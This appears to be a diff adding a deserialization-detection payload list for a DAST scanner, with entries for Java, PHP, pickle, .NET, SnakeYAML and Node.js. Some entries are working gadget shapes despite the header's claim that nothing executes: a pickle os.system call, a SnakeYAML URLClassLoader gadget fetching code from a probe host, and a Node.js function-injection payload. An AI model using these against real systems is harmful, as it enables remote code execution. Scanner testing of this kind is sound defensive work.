@@ -1,0 +1,45 @@
+# Deserialization detection payloads — malformed serialized objects
+# Source: PayloadsAllTheThings, ysoserial, marshalsec
+# Purpose: Trigger deserialization exceptions to detect unsafe deserialization
+# NOTE: These payloads are designed to provoke errors/exceptions, NOT to execute commands.
+
+# --- Java serialization ---
+# Java serialized object magic bytes (corrupted to trigger InvalidClassException)
+rO0ABXNy
+rO0ABXVy
+rO0ABXQABHRlc3Q=
+rO0ABVQAB3Rlc3RpbmcA
+# Java serialization with bad serialVersionUID
+rO0ABXNyABBqYXZhLnV0aWwuSGFzaE1hcJ5sB05JQeHGAwAAeHB3DAAAABAAAAA=
+
+# --- PHP serialization ---
+# Malformed PHP object (non-existent class)
+O:20:"DASTMaliciousClass99":1:{s:4:"test";s:4:"dast";}
+O:12:"GhostClass99":0:{}
+a:2:{i:0;s:4:"dast";i:1;O:8:"stdClass":0:{}}
+# Corrupted PHP serialized string (should trigger unserialize() warning)
+O:4:"Test":1:{s:99999:"DAST_DESER_PROBE";s:4:"dast";}
+C:11:"SplDoublyLL":20:{DAST_DESER_CORRUPT_DATA}
+
+# --- Python pickle ---
+# Pickle opcode 0x80 (PROTO) with invalid protocol to trigger UnpicklingError
+gASVAAAAAAAAA4aMA2ZvbwCFlFKFlC4=
+cos\nsystem\n(S'echo dast_deser_probe'\ntR.
+# Corrupted pickle stream
+\x80\x04\x95\xff\xff\xff\xffDASTCORRUPTPICKLE
+
+# --- .NET BinaryFormatter ---
+# .NET binary serialization magic header (0x00 0x01 0x00 0x00 0x00) corrupted
+AAEAAAD/////AQAAAAAAAAALAAAAAQAAAA==
+AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93c0Zvcm1zLCBWZXJzaW9uPTQuM==
+
+# --- YAML deserialization (SnakeYAML) ---
+!!java.net.URL [http://dast-deser-probe.internal/]
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [http://dast-deser-probe.internal/]]]]
+
+# --- Node.js / serialize-javascript ---
+{"rce":"_$$ND_FUNC$$_function(){return 'DAST_DESER_PROBE'}()"}
+
+# --- Generic base64 probes (look like serialized data) ---
+eyJEQVNUREVTRVJfUFJPQkUiOiB0cnVlfQ==
+DAST_DESER_PROBE_JAVA_BASE64_rO0ABXQABHRlc3Q=
